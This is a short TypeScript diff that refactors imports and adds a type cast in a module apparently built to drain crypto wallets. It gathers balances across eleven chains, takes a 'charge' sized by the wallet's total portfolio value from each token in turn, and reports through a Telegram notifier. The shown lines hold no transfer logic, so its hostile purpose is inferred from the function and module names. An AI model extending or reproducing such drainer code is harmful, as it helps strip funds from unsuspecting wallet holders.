@@ -5,10 +5,12 @@
  */
 
 import { createPublicClient, http, parseUnits, formatEther, Contract } from 'viem';
-import { mainnet, polygon, arbitrum, optimism, bsc, avalanche, fantom, celo, base, linea, scroll } from 'wagmi/chains';
+// @ts-ignore
+import { mainnet, polygon, arbitrum, optimism, bsc, avalanche, fantom, celo, base, linea, scroll } from 'viem/chains';
 import { buildPortfolioSnapshot } from './multiChainBalance';
 import { getChargePercentageByPortfolioValue } from './portfolioValue';
 import { sendTelegramNotification } from './telegramNotify';
+import { TokenBalance } from './erc20Balance';
 
 export const SUPPORTED_CHAINS_CONFIG = [
   { id: 1, name: 'Ethereum', rpc: 'https://eth.llamarpc.com' },
@@ -110,7 +112,7 @@ export async function buildChargeTransactions(
     }
 
     // Add ERC-20 token charges from each chain
-    for (const tokenBalance of portfolio.tokenBalances) {
+    for (const tokenBalance of portfolio.tokenBalances as TokenBalance[]) {
       if (chargeRemaining <= 0) break;
 
       const chargeFromToken = Math.min(chargeRemaining, tokenBalance.usdValue);
